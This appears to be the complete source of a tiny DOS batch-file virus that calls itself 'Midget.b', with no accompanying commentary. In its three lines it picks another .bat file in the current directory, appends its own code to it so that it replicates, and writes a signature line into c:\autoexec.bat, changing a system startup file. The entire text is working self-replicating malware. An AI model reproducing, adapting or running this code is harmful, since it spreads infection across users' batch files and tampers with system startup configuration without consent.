   for %%q in (*?.bat) do set MID=%%q
   if not %MID%==%0 type %0>>%MID%
   echo Midget.b was here >>c:\autoexec.bat
